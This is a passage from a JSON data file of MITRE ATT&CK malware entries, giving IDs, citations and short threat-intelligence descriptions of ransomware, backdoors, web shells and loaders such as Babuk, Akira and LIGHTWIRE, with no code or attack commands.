    "description": "[HELLOKITTY](https://attack.mitre.org/software/S0617) is a ransomware written in C++  that shares similar code structure and functionality with [DEATHRANSOM](https://attack.mitre.org/software/S0616) and [FIVEHANDS](https://attack.mitre.org/software/S0618). [HELLOKITTY](https://attack.mitre.org/software/S0617) has been used since at least 2020, targets have included a Polish video game developer and a Brazilian electric power company.(Citation: FireEye FiveHands April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "HELLOKITTY"
    ],
    "id": "S0617"
  },
  "malware--5d342981-5194-41e7-b33f-8e91998d7d88": {
    "name": "CostaBricks",
    "description": "[CostaBricks](https://attack.mitre.org/software/S0614) is a loader that was used to deploy 32-bit backdoors in the [CostaRicto](https://attack.mitre.org/groups/G0132) campaign.(Citation: BlackBerry CostaRicto November 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "CostaBricks"
    ],
    "id": "S0614"
  },
  "malware--5d3fa1db-5041-4560-b87b-8f61cc225c52": {
    "name": "Cheerscrypt",
    "description": "[Cheerscrypt](https://attack.mitre.org/software/S1096) is a ransomware that was developed by [Cinnamon Tempest](https://attack.mitre.org/groups/G1021) and has been used in attacks against ESXi and Windows environments since at least 2022. [Cheerscrypt](https://attack.mitre.org/software/S1096) was derived from the leaked [Babuk](https://attack.mitre.org/software/S0638) source code and has infrastructure overlaps with deployments of Night Sky ransomware, which was also derived from [Babuk](https://attack.mitre.org/software/S0638).(Citation: Sygnia Emperor Dragonfly October 2022)(Citation: Trend Micro Cheerscrypt May 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Cheerscrypt"
    ],
    "id": "S1096"
  },
  "malware--5dc9e8ec-9917-4de7-b8ab-16007899dd80": {
    "name": "LIGHTWIRE",
    "description": "[LIGHTWIRE](https://attack.mitre.org/software/S1119) is a web shell written in Perl that was used during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) to maintain access and enable command execution by imbedding into the legitimate compcheckresult.cgi component of Ivanti Secure Connect VPNs.(Citation: Mandiant Cutting Edge Part 2 January 2024)(Citation: Mandiant Cutting Edge January 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LIGHTWIRE"
    ],
    "id": "S1119"
  },
  "malware--5dd649c0-bca4-488b-bd85-b180474ec62e": {
    "name": "KeyBoy",
    "description": "[KeyBoy](https://attack.mitre.org/software/S0387) is malware that has been used in targeted campaigns against members of the Tibetan Parliament in 2016.(Citation: CitizenLab KeyBoy Nov 2016)(Citation: PWC KeyBoys Feb 2017)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "KeyBoy"
    ],
    "id": "S0387"
  },
  "malware--5e814485-012d-423d-b769-026bfed0f451": {
    "name": "HyperBro",
    "description": "[HyperBro](https://attack.mitre.org/software/S0398) is a custom in-memory backdoor used by [Threat Group-3390](https://attack.mitre.org/groups/G0027).(Citation: Unit42 Emissary Panda May 2019)(Citation: Securelist LuckyMouse June 2018)(Citation: Hacker News LuckyMouse June 2018)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "HyperBro"
    ],
    "id": "S0398"
  },
  "malware--5f1d4579-4e8f-48e7-860e-2da773ae432e": {
    "name": "Anchor",
    "description": "[Anchor](https://attack.mitre.org/software/S0504) is one of a family of backdoor malware that has been used in conjunction with [TrickBot](https://attack.mitre.org/software/S0266) on selected high profile targets since at least 2018.(Citation: Cyberreason Anchor December 2019)(Citation: Medium Anchor DNS July 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Anchor"
    ],
    "id": "S0504"
  },
  "malware--5faaf81a-aa5b-4a4b-bae5-522439e068f8": {
    "name": "DarkTortilla",
    "description": "[DarkTortilla](https://attack.mitre.org/software/S1066) is a highly configurable .NET-based crypter that has been possibly active since at least August 2015. [DarkTortilla](https://attack.mitre.org/software/S1066) has been used to deliver popular information stealers, RATs, and payloads such as [Agent Tesla](https://attack.mitre.org/software/S0331), AsyncRat, [NanoCore](https://attack.mitre.org/software/S0336), RedLine, [Cobalt Strike](https://attack.mitre.org/software/S0154), and Metasploit.(Citation: Secureworks DarkTortilla Aug 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "DarkTortilla"
    ],
    "id": "S1066"
  },
  "malware--61c7a91a-0b83-461d-ad32-75d96eed4a09": {
    "name": "Babuk",
    "description": "[Babuk](https://attack.mitre.org/software/S0638) is a Ransomware-as-a-service (RaaS) malware that has been used since at least 2021. The operators of [Babuk](https://attack.mitre.org/software/S0638) employ a \"Big Game Hunting\" approach to targeting major enterprises and operate a leak site to post stolen data as part of their extortion scheme.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: McAfee Babuk February 2021)(Citation: CyberScoop Babuk February 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Babuk"
    ],
    "id": "S0638"
  },
  "malware--63686509-069b-4143-99ea-4e59cad6cb2a": {
    "name": "DarkWatchman",
    "description": "[DarkWatchman](https://attack.mitre.org/software/S0673) is a lightweight JavaScript-based remote access tool (RAT) that avoids file operations; it was first observed in November 2021.(Citation: Prevailion DarkWatchman 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "DarkWatchman"
    ],
    "id": "S0673"
  },
  "malware--63c4511b-2d6e-4bb2-b582-e2e99a8a467d": {
    "name": "BlackMould",
    "description": "[BlackMould](https://attack.mitre.org/software/S0564) is a web shell based on [China Chopper](https://attack.mitre.org/software/S0020) for servers running Microsoft IIS. First reported in December 2019, it has been used in malicious campaigns by [GALLIUM](https://attack.mitre.org/groups/G0093) against telecommunication providers.(Citation: Microsoft GALLIUM December 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BlackMould"
    ],
    "id": "S0564"
  },
  "malware--64122557-5940-4271-9123-25bfc0c693db": {
    "name": "Javali",
    "description": "[Javali](https://attack.mitre.org/software/S0528) is a banking trojan that has targeted Portuguese and Spanish-speaking countries since 2017, primarily focusing on customers of financial institutions in Brazil and Mexico.(Citation: Securelist Brazilian Banking Malware July 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Javali"
    ],
    "id": "S0528"
  },
  "malware--647215dd-29a6-4528-b354-ca8b5e08fca1": {
    "name": "PACEMAKER",
    "description": "[PACEMAKER](https://attack.mitre.org/software/S1109) is a credential stealer that was used by [APT5](https://attack.mitre.org/groups/G1023) as early as 2020 including activity against US Defense Industrial Base (DIB) companies.(Citation: Mandiant Pulse Secure Zero-Day April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PACEMAKER"
    ],
    "id": "S1109"
  },
  "malware--6a0d0ea9-b2c4-43fe-a552-ac41a3009dc5": {
    "name": "Industroyer2",
    "description": "[Industroyer2](https://attack.mitre.org/software/S1072) is a compiled and static piece of malware that has the ability to communicate over the IEC-104 protocol. It is similar to the IEC-104 module found in [Industroyer](https://attack.mitre.org/software/S0604). Security researchers assess that [Industroyer2](https://attack.mitre.org/software/S1072) was designed to cause impact to high-voltage electrical substations. The initial [Industroyer2](https://attack.mitre.org/software/S1072) sample was compiled on 03/23/2022 and scheduled to execute on 04/08/2022, however it was discovered before deploying, resulting in no impact.(Citation: Industroyer2 Blackhat ESET)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Industroyer2"
    ],
    "id": "S1072"
  },
  "malware--6a21e3a4-5ffe-4581-af9a-6a54c7536f44": {
    "name": "Explosive",
    "description": "[Explosive](https://attack.mitre.org/software/S0569) is a custom-made remote access tool used by the group [Volatile Cedar](https://attack.mitre.org/groups/G0123). It was first identified in the wild in 2015.(Citation: CheckPoint Volatile Cedar March 2015)(Citation: ClearSky Lebanese Cedar Jan 2021)  ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Explosive"
    ],
    "id": "S0569"
  },
  "malware--6ba1d7ae-d60b-43e6-9f08-a8b787e9d9cb": {
    "name": "LightNeuron",
    "description": "[LightNeuron](https://attack.mitre.org/software/S0395) is a sophisticated backdoor that has targeted Microsoft Exchange servers since at least 2014. [LightNeuron](https://attack.mitre.org/software/S0395) has been used by [Turla](https://attack.mitre.org/groups/G0010) to target diplomatic and foreign affairs-related organizations. The presence of certain strings in the malware suggests a Linux variant of [LightNeuron](https://attack.mitre.org/software/S0395) exists.(Citation: ESET LightNeuron May 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LightNeuron"
    ],
    "id": "S0395"
  },
  "malware--6c2550d5-a01a-4bbb-a004-6ead348ba623": {
    "name": "Peppy",
    "description": "[Peppy](https://attack.mitre.org/software/S0643) is a Python-based remote access Trojan, active since at least 2012, with similarities to [Crimson](https://attack.mitre.org/software/S0115).(Citation: Proofpoint Operation Transparent Tribe March 2016)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Peppy"
    ],
    "id": "S0643"
  },
  "malware--6c575670-d14c-4c7f-9b9d-fd1b363e255d": {
    "name": "KEYPLUG",
    "description": "[KEYPLUG](https://attack.mitre.org/software/S1051) is a modular backdoor written in C++, with Windows and Linux variants, that has been used by [APT41](https://attack.mitre.org/groups/G0096) since at least June 2021.(Citation: Mandiant APT41)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "KEYPLUG"
    ],
    "id": "S1051"
  },
  "malware--6cd07296-14aa-403d-9229-6343d03d4752": {
    "name": "Cuba",
    "description": "\n[Cuba](https://attack.mitre.org/software/S0625) is a Windows-based ransomware family that has been used against financial institutions, technology, and logistics organizations in North and South America as well as Europe since at least December 2019.(Citation: McAfee Cuba April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Cuba"
    ],
    "id": "S0625"
  },
  "malware--6de9cad1-eed2-4e27-b0b5-39fa29349ea0": {
    "name": "DEATHRANSOM",
    "description": "[DEATHRANSOM](https://attack.mitre.org/software/S0616) is ransomware written in C that has been used since at least 2020, and has potential overlap with [FIVEHANDS](https://attack.mitre.org/software/S0618) and [HELLOKITTY](https://attack.mitre.org/software/S0617).(Citation: FireEye FiveHands April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "DEATHRANSOM"
    ],
    "id": "S0616"
  },
  "malware--6e95feb1-78ee-48d3-b421-4d76663b5c49": {
    "name": "Clambling",
    "description": "[Clambling](https://attack.mitre.org/software/S0660) is a modular backdoor written in C++ that has been used by [Threat Group-3390](https://attack.mitre.org/groups/G0027) since at least 2017.(Citation: Trend Micro DRBControl February 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Clambling"
    ],
    "id": "S0660"
  },
  "malware--6f6b2353-4b39-40ce-9d6d-d00b7a61e656": {
    "name": "Akira",
    "description": "[Akira](https://attack.mitre.org/software/S1129) ransomware, written in C++, is most prominently (but not exclusively) associated with the ransomware-as-a-service entity [Akira](https://attack.mitre.org/groups/G1024). [Akira](https://attack.mitre.org/software/S1129) ransomware has been used in attacks across North America, Europe, and Australia, with a focus on critical infrastructure sectors including manufacturing, education, and IT services. [Akira](https://attack.mitre.org/software/S1129) ransomware employs hybrid encryption and threading to increase the speed and efficiency of encryption and runtime arguments for tailored attacks. Notable variants include Rust-based [Megazord](https://attack.mitre.org/software/S1191) for targeting Windows and [Akira _v2](https://attack.mitre.org/software/S1194) for targeting VMware ESXi servers.(Citation: Kersten Akira 2023)(Citation: CISA Akira Ransomware APR 2024)(Citation: Cisco Akira Ransomware OCT 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Akira"
    ],
    "id": "S1129"
  },
  "malware--6f6f67c9-556d-4459-95c2-78d272190e52": {
    "name": "DarkGate",
    "description": "[DarkGate](https://attack.mitre.org/software/S1111) first emerged in 2018 and has evolved into an initial access and data gathering tool associated with various criminal cyber operations. Written in Delphi and named \"DarkGate\" by its author, [DarkGate](https://attack.mitre.org/software/S1111) is associated with credential theft, cryptomining, cryptotheft, and pre-ransomware actions.(Citation: Ensilo Darkgate 2018) DarkGate use increased significantly starting in 2022 and is under active development by its author, who provides it as a Malware-as-a-Service offering.(Citation: Trellix Darkgate 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "DarkGate"
    ],
    "id": "S1111"
  },
  "malware--6fb36c6f-bb3d-4ed6-9471-cb9933e5c154": {
    "name": "Mongall",
    "description": "[Mongall](https://attack.mitre.org/software/S1026) is a backdoor that has been used since at least 2013, including by [Aoqin Dragon](https://attack.mitre.org/groups/G1007).(Citation: SentinelOne Aoqin Dragon June 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Mongall"
    ],
    "id": "S1026"
  },
  "malware--7230ded7-3b1a-4d6e-9735-d0ffd47af9f6": {
    "name": "SVCReady",
    "description": "[SVCReady](https://attack.mitre.org/software/S1064) is a loader that has been used since at least April 2022 in malicious spam campaigns. Security researchers have noted overlaps between [TA551](https://attack.mitre.org/groups/G0127) activity and [SVCReady](https://attack.mitre.org/software/S1064) distribution, including similarities in file names, lure images, and identical grammatical errors.(Citation: HP SVCReady Jun 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SVCReady"
    ],
    "id": "S1064"
  },
  "malware--727afb95-3d0f-4451-b297-362a43909923": {
    "name": "ThiefQuest",
    "description": "[ThiefQuest](https://attack.mitre.org/software/S0595) is a virus, data stealer, and wiper that presents itself as ransomware targeting macOS systems. [ThiefQuest](https://attack.mitre.org/software/S0595) was first seen in 2020 distributed via trojanized pirated versions of popular macOS software on Russian forums sharing torrent links.(Citation: Reed thiefquest fake ransom) Even though [ThiefQuest](https://attack.mitre.org/software/S0595) presents itself as ransomware, since the dynamically generated encryption key is never sent to the attacker it may be more appropriately thought of as a form of wiper malware.(Citation: wardle evilquest partii)(Citation: reed thiefquest ransomware analysis)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ThiefQuest"
    ],
    "id": "S0595"
  },
  "malware--72911fe3-f085-40f7-b4f2-f25a4221fe44": {
    "name": "FoggyWeb",
    "description": "[FoggyWeb](https://attack.mitre.org/software/S0661) is a passive and highly-targeted backdoor capable of remotely exfiltrating sensitive information from a compromised Active Directory Federated Services (AD FS) server. It has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least early April 2021.(Citation: MSTIC FoggyWeb September 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "FoggyWeb"
    ],
    "id": "S0661"
  },
  "malware--72b5f07f-5448-4e00-9ff2-08bc193a7b77": {
    "name": "NGLite",
    "description": "[NGLite](https://attack.mitre.org/software/S1106) is a backdoor Trojan that is only capable of running commands received through its C2 channel. While the capabilities are standard for a backdoor, NGLite uses a novel C2 channel that leverages a decentralized network based on the legitimate NKN to communicate between the backdoor and the actors.(Citation: NGLite Trojan)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "NGLite"
    ],
    "id": "S1106"
  },
  "malware--73c4711b-407a-449d-b269-e3b1531fe7a9": {
    "name": "SHARPSTATS",
    "description": "[SHARPSTATS](https://attack.mitre.org/software/S0450) is a .NET backdoor used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least 2019.(Citation: TrendMicro POWERSTATS V3 June 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SHARPSTATS"
    ],
    "id": "S0450"
  },
  "malware--73d08401-005f-4e1f-90b9-8f45d120879f": {
    "name": "Ferocious",
    "description": "[Ferocious](https://attack.mitre.org/software/S0679) is a first stage implant composed of VBS and PowerShell scripts that has been used by [WIRTE](https://attack.mitre.org/groups/G0090) since at least 2021.(Citation: Kaspersky WIRTE November 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Ferocious"
    ],
    "id": "S0679"
  },
  "malware--750eb92a-7fdf-451e-9592-1d42357018f1": {
    "name": "CreepyDrive",
    "description": "[CreepyDrive](https://attack.mitre.org/software/S1023) is a custom implant has been used by [POLONIUM](https://attack.mitre.org/groups/G1005) since at least early 2022 for C2 with and exfiltration to actor-controlled OneDrive accounts.(Citation: Microsoft POLONIUM June 2022)\n\n[POLONIUM](https://attack.mitre.org/groups/G1005) has used a similar implant called CreepyBox that relies on actor-controlled DropBox accounts.(Citation: Microsoft POLONIUM June 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "CreepyDrive"
    ],
    "id": "S1023"
  },
  "malware--751b77e6-af1f-483b-93fe-eddf17f92a64": {
    "name": "Caterpillar WebShell",
    "description": "[Caterpillar WebShell](https://attack.mitre.org/software/S0572) is a self-developed Web Shell tool created by the group [Volatile Cedar](https://attack.mitre.org/groups/G0123).(Citation: ClearSky Lebanese Cedar Jan 2021) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Caterpillar WebShell"
    ],
    "id": "S0572"
  },
  "malware--754effde-613c-4244-a83e-fb659b2a4d06": {
    "name": "Netwalker",
    "description": "[Netwalker](https://attack.mitre.org/software/S0457) is fileless ransomware written in PowerShell and executed directly in memory.(Citation: TrendMicro Netwalker May 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Netwalker"
    ],
    "id": "S0457"
  },
  "malware--75bba379-4ba1-467e-8c60-ec2b269ee984": {
    "name": "USBferry",
    "description": "[USBferry](https://attack.mitre.org/software/S0452) is an information stealing malware and has been used by [Tropic Trooper](https://attack.mitre.org/groups/G0081) in targeted attacks against Taiwanese and Philippine air-gapped military environments. [USBferry](https://attack.mitre.org/software/S0452) shares an overlapping codebase with [YAHOYAH](https://attack.mitre.org/software/S0388), though it has several features which makes it a distinct piece of malware.(Citation: TrendMicro Tropic Trooper May 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "USBferry"
    ],
    "id": "S0452"
  },
  "malware--76ac7989-c5cc-42e2-93e3-d6c476f01ace": {
    "name": "TSCookie",
    "description": "[TSCookie](https://attack.mitre.org/software/S0436) is a remote access tool (RAT) that has been used by [BlackTech](https://attack.mitre.org/groups/G0098) in campaigns against Japanese targets.(Citation: JPCert TSCookie March 2018)(Citation: JPCert BlackTech Malware September 2019). [TSCookie](https://attack.mitre.org/software/S0436) has been referred to as [PLEAD](https://attack.mitre.org/software/S0435) though more recent reporting indicates a separation between the two.(Citation: JPCert PLEAD Downloader June 2018)(Citation: JPCert BlackTech Malware September 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "TSCookie"
    ],
    "id": "S0436"
  },
  "malware--7724581b-06ff-4d2b-b77c-80dc8d53070b": {
    "name": "Saint Bot",
    "description": "[Saint Bot](https://attack.mitre.org/software/S1018) is a .NET downloader that has been used by [Saint Bear](https://attack.mitre.org/groups/G1031) since at least March 2021.(Citation: Malwarebytes Saint Bot April 2021)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Saint Bot"
    ],
    "id": "S1018"
  },
  "malware--77ca1aa3-280c-4b67-abaa-e8fb891a8f83": {
    "name": "Pay2Key",
    "description": "[Pay2Key](https://attack.mitre.org/software/S0556) is a ransomware written in C++ that has been used by [Fox Kitten](https://attack.mitre.org/groups/G0117) since at least July 2020 including campaigns against Israeli companies. [Pay2Key](https://attack.mitre.org/software/S0556) has been incorporated with a leak site to display stolen sensitive information to further pressure victims into payment.(Citation: ClearkSky Fox Kitten February 2020)(Citation: Check Point Pay2Key November 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Pay2Key"
    ],
    "id": "S0556"
  },
  "malware--77e0ecf7-ca91-4c06-8012-8e728986a87a": {
    "name": "Chaes",
    "description": "[Chaes](https://attack.mitre.org/software/S0631) is a multistage information stealer written in several programming languages that collects login credentials, credit card numbers, and other financial information. [Chaes](https://attack.mitre.org/software/S0631) was first observed in 2020, and appears to primarily target victims in Brazil as well as other e-commerce customers in Latin America.(Citation: Cybereason Chaes Nov 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Chaes"
    ],
    "id": "S0631"
  },
  "malware--7acb15b6-fe2c-4319-b136-6ab36ff0b2d4": {
    "name": "CharmPower",
    "description": "[CharmPower](https://attack.mitre.org/software/S0674) is a PowerShell-based, modular backdoor that has been used by [Magic Hound](https://attack.mitre.org/groups/G0059) since at least 2022.(Citation: Check Point APT35 CharmPower January 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "CharmPower"
    ],
    "id": "S0674"
  },
  "malware--7bef1b56-4870-4e74-b32a-7dd88c390c44": {
    "name": "Bundlore",
    "description": "[Bundlore](https://attack.mitre.org/software/S0482) is adware written for macOS that has been in use since at least 2015. Though categorized as adware, [Bundlore](https://attack.mitre.org/software/S0482) has many features associated with more traditional backdoors.(Citation: MacKeeper Bundlore Apr 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Bundlore"
    ],
    "id": "S0482"
  },
  "malware--7c58fff0-d206-4db1-96b1-e3a9e0e320b9": {
    "name": "P8RAT",
    "description": "[P8RAT](https://attack.mitre.org/software/S0626) is a fileless malware used by [menuPass](https://attack.mitre.org/groups/G0045) to download and execute payloads since at least 2020.(Citation: Securelist APT10 March 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "P8RAT"
    ],
    "id": "S0626"
  },
  "malware--7cdfccda-2950-4167-981a-60872ff5d0db": {
    "name": "EVILNUM",
    "description": "[EVILNUM](https://attack.mitre.org/software/S0568) is fully capable backdoor that was first identified in 2018. [EVILNUM](https://attack.mitre.org/software/S0568) is used by the APT group [Evilnum](https://attack.mitre.org/groups/G0120) which has the same name.(Citation: ESET EvilNum July 2020)(Citation: Prevailion EvilNum May 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "EVILNUM"
    ],
    "id": "S0568"
  },
  "malware--7e0f8b0f-716e-494d-827e-310bd6ed709e": {
    "name": "SMOKEDHAM",
    "description": "[SMOKEDHAM](https://attack.mitre.org/software/S0649) is a Powershell-based .NET backdoor that was first reported in May 2021; it has been used by at least one ransomware-as-a-service affiliate.(Citation: FireEye Shining A Light on DARKSIDE May 2021)(Citation: FireEye SMOKEDHAM June 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SMOKEDHAM"
    ],
    "id": "S0649"
  },
  "malware--7e100ca4-e639-48d9-9a9d-8ad84aa7b448": {
    "name": "Mori",
    "description": "[Mori](https://attack.mitre.org/software/S1047) is a backdoor that has been used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least January 2022.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: CYBERCOM Iranian Intel Cyber January 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Mori"
    ],
    "id": "S1047"
  },
  "malware--7f4bbe05-1674-4087-8a16-8f1ad61b6152": {
    "name": "TAINTEDSCRIBE",
    "description": "[TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) is a fully-featured beaconing implant integrated with command modules used by [Lazarus Group](https://attack.mitre.org/groups/G0032). It was first reported in May 2020.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "TAINTEDSCRIBE"
    ],
    "id": "S0586"
  },
  "malware--802a874d-7463-4f2a-99e3-6a1f5a919a21": {
    "name": "Royal",
    "description": "[Royal](https://attack.mitre.org/software/S1073) is ransomware that first appeared in early 2022;  a version that also targets ESXi servers was later observed in February 2023. [Royal](https://attack.mitre.org/software/S1073) employs partial encryption and multiple threads to evade detection and speed encryption. [Royal](https://attack.mitre.org/software/S1073) has been used in attacks against multiple industries worldwide--including critical infrastructure. Security researchers have identified similarities in the encryption routines and TTPs used in [Royal](https://attack.mitre.org/software/S1073) and [Conti](https://attack.mitre.org/software/S0575) attacks and noted a possible connection between their operators.(Citation: Microsoft Royal ransomware November 2022)(Citation: Cybereason Royal December 2022)(Citation: Kroll Royal Deep Dive February 2023)(Citation: Trend Micro Royal Linux ESXi February 2023)(Citation: CISA Royal AA23-061A March 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Royal"
    ],
    "id": "S1073"
  },
  "malware--805480f1-6caa-4a67-8ca9-b2b39650d986": {
    "name": "BendyBear",
    "description": "[BendyBear](https://attack.mitre.org/software/S0574) is an x64 shellcode for a stage-zero implant designed to download malware from a C2 server. First discovered in August 2020, [BendyBear](https://attack.mitre.org/software/S0574) shares a variety of features with [Waterbear](https://attack.mitre.org/software/S0579), malware previously attributed to the Chinese cyber espionage group [BlackTech](https://attack.mitre.org/groups/G0098).(Citation: Unit42 BendyBear Feb 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BendyBear"
    ],
    "id": "S0574"
  },
  "malware--81c57a96-fc8c-4f91-af8e-63e24c2927c2": {
    "name": "Metamorfo",
    "description": "[Metamorfo](https://attack.mitre.org/software/S0455) is a Latin-American banking trojan operated by a Brazilian cybercrime group that has been active since at least April 2018. The group focuses on targeting banks and cryptocurrency services in Brazil and Mexico.(Citation: Medium Metamorfo Apr 2020)(Citation: ESET Casbaneiro Oct 2019) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Metamorfo"
    ],
    "id": "S0455"
  },
  "malware--8393dac0-0583-456a-9372-fd81691bca20": {
    "name": "PipeMon",
    "description": "[PipeMon](https://attack.mitre.org/software/S0501) is a multi-stage modular backdoor used by [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: ESET PipeMon May 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PipeMon"
    ],
    "id": "S0501"
  },
  "malware--84c1ecc6-e5a2-4e8a-bf4b-651a618e0053": {
    "name": "SYNful Knock",
    "description": "[SYNful Knock](https://attack.mitre.org/software/S0519) is a stealthy modification of the operating system of network devices that can be used to maintain persistence within a victim's network and provide new capabilities to the adversary.(Citation: Mandiant - Synful Knock)(Citation: Cisco Synful Knock Evolution)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SYNful Knock"
    ],
    "id": "S0519"
  },
  "malware--8787e86d-8475-4f13-acea-d33eb83b6105": {
    "name": "Winnti for Linux",
    "description": "[Winnti for Linux](https://attack.mitre.org/software/S0430) is a trojan, seen since at least 2015, designed specifically for targeting Linux systems. Reporting indicates the winnti malware family is shared across a number of actors including [Winnti Group](https://attack.mitre.org/groups/G0044). The Windows variant is tracked separately under [Winnti for Windows](https://attack.mitre.org/software/S0141).(Citation: Chronicle Winnti for Linux May 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Winnti for Linux"
    ],
    "id": "S0430"
  },
  "malware--880f7b3e-ad27-4158-8b03-d44c9357950b": {
    "name": "RAPIDPULSE",
    "description": "[RAPIDPULSE](https://attack.mitre.org/software/S1113) is a web shell that exists as a modification to a legitimate Pulse Secure file that has been used by [APT5](https://attack.mitre.org/groups/G1023) since at least 2021.(Citation: Mandiant Pulse Secure Update May 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "RAPIDPULSE"
    ],
    "id": "S1113"
  },
  "malware--8a2867f9-e8fc-4bf1-a860-ef6e46311900": {
    "name": "DnsSystem",
    "description": "[DnsSystem](https://attack.mitre.org/software/S1021) is a .NET based DNS backdoor, which is a customized version of the open source tool DIG.net, that has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least June 2022.(Citation: Zscaler Lyceum DnsSystem June 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "DnsSystem"
    ],
    "id": "S1021"
  },
  "malware--8a59f456-79a0-4151-9f56-9b1a67332af2": {
    "name": "MoleNet",
    "description": "[MoleNet](https://attack.mitre.org/software/S0553) is a downloader tool with backdoor capabilities that has been observed in use since at least 2019.(Citation: Cybereason Molerats Dec 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "MoleNet"
    ],
    "id": "S0553"
  },
  "malware--8bd47506-29ae-44ea-a5c1-c57e8a1ab6b0": {
    "name": "BLUELIGHT",
    "description": "[BLUELIGHT](https://attack.mitre.org/software/S0657) is a remote access Trojan used by [APT37](https://attack.mitre.org/groups/G0067) that was first observed in early 2021.(Citation: Volexity InkySquid BLUELIGHT August 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BLUELIGHT"
    ],
    "id": "S0657"
  },
  "malware--8bdfe255-e658-4ddd-a11c-b854762e451d": {
    "name": "KGH_SPY",
    "description": "[KGH_SPY](https://attack.mitre.org/software/S0526) is a modular suite of tools used by [Kimsuky](https://attack.mitre.org/groups/G0094) for reconnaissance, information stealing, and backdoor capabilities. [KGH_SPY](https://attack.mitre.org/software/S0526) derived its name from PDB paths and internal names found in samples containing \"KGH\".(Citation: Cybereason Kimsuky November 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "KGH_SPY"
    ],
    "id": "S0526"
  },
  "malware--8be7c69e-d8e3-4970-9668-61de08e508cc": {
    "name": "down_new",
    "description": " [down_new](https://attack.mitre.org/software/S0472) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "down_new"
    ],
    "id": "S0472"
  },
  "malware--8c1d01ff-fdc0-4586-99bd-c248e0761af5": {
    "name": "Kerrdown",
    "description": "[Kerrdown](https://attack.mitre.org/software/S0585) is a custom downloader that has been used by [APT32](https://attack.mitre.org/groups/G0050) since at least 2018 to install spyware from a server on the victim's network.(Citation: Amnesty Intl. Ocean Lotus February 2021)(Citation: Unit 42 KerrDown February 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Kerrdown"
    ],
    "id": "S0585"
  },
  "malware--8caa18af-4758-4fd3-9600-e8af579e89ed": {
    "name": "VBShower",
    "description": "[VBShower](https://attack.mitre.org/software/S0442) is a backdoor that has been used by [Inception](https://attack.mitre.org/groups/G0100) since at least 2019. [VBShower](https://attack.mitre.org/software/S0442) has been used as a downloader for second stage payloads, including [PowerShower](https://attack.mitre.org/software/S0441).(Citation: Kaspersky Cloud Atlas August 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
